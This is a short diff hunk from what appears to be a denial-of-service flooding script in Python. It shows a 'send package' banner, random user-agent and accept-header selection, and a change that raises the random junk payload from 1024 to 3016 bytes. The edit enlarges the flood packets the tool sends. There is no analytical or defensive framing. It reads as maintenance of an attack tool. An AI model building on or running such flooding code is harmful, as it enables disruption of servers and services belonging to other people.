@@ -89,7 +89,7 @@ print("\033[95m                  >>> send package \033[0m "),
 time.sleep(5),
 def start():
     global useragents, ref, acceptall
-    hh = random._urandom(1024)
+    hh = random._urandom(3016)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
